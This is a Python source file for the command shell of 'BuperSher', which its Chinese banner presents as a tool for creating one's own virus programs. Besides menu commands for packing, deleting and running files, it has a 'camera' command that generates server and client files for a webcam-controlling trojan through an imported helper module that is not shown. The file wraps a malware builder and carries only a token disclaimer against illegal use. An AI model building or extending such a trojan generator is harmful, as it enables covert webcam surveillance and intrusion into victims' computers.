import os
import sys

version = "V 1.0.0"

title = f"""
            _____                          ______ __
           |  __ \.--.--.-----.-----.----.|    __|  |--.-----.----.
           |  __ <|  |  |  _  |  -__|   _||__    |     |  -__|   _|
           |_____/|_____|   __|_____|__|  |______|__|__|_____|__|  
                        |__|
             
XXX_STALKER
简介：一款专门用于创建属于你自己的病毒程序的工具
输入 'help' 查看帮助文档
{version}
================================ BuperSher  ================================
请勿用于任何非法目的 ! ! !
"""

help = """
========================== BuperSher - Help document ==========================
普通命令:
    cls: 清屏                                   help: 帮助文档
    exit: 退出程序                              version: 显示版本号
    pack: 打包程序                              check: 查看程序文件
    remove: 删除文件                            run: 运行指定的程序
    dir: 查看当前目录                           dir -pg: 查看program文件夹的目录
    dir -dist: 查看dist文件夹的目录
 
特殊命令:
    camera   [1]   创建控制摄像头木马
===============================================================================
"""

def init_bps():
    from assist import check
    check()
    os.system("cls" if os.name == "nt" else "clear")

def main():
    try:
        init_bps()
        print(title)
        while True:
            command = input("BpS $> ")
            if command == "help":
                print(help)
            elif command == "cls":
                os.system("cls" if os.name == "nt" else "clear")
                print(title)
            elif command in ["version", "vs"]:
                print(version)
            elif command == "pack":
                from assist import pack
                pack()
            elif command in ["remove", "rm", "delete", "del"]:
                try:
                    choose_d_f = input("[1] --- 文件\n[2] --- 文件夹\n> ")
                    if choose_d_f == "1":
                        choos_file = input("文件名:")
                        os.remove(choos_file)
                        print(f"文件“{choos_file}”已删除")
                    elif choose_d_f == "2":
                        choos_file = input("文件夹名称:")
                        os.rmdir(choos_file)
                        print(f"名为“{choos_file}”的文件夹已删除")
                    else:
                        print("无效选择")
                except FileNotFoundError:
                    print(f"未找到文件“{choos_file}”")
            elif command == "dir":
                os.system("dir")
            elif command in ["dir -pg", "dir -program"]:
                os.system("dir program")
            elif command == "dir -dist":
                os.system("dir dist")
            elif command == "run":
                try:
                    choos_file = input("文件路径: ")
                    if choos_file.endswith(".py"):
                        os.system(f"python {choos_file}")
                    if choos_file.endswith(".exe"):
                        os.system(f"start {choos_file}")
                except FileNotFoundError:
                    print(f"文件“{choos_file}”未找到")
            elif command == "exit":
                sys.exit()
            
            elif command in ["camera", "create -1"]:
                print("")
                from assist import run_create_server_camera, run_create_client_camera

                print("是否创建 -camera- 服务器文件? (y/n)")
                choose = input("> ")
                if choose in ["Y", "y"]:
                    run_create_server_camera()
                else:
                    print("已取消创建 -camera- 服务器文件")
                
                print("是否创建 -camera- 客户端文件? (y/n)")
                choose = input("> ")
                if choose in ["Y", "y"]:
                    run_create_client_camera()
                else:
                    print("已取消创建 -camera- 客户端文件")

                print("创建完成")
                print("可以再次输入 'pack' 打包您的 .py 程序")
                print("")
    except Exception as e:
        print(f"错误: {e}")
    except FileNotFoundError:
        print("错误: 未找到文件")

if __name__ == "__main__":
    main()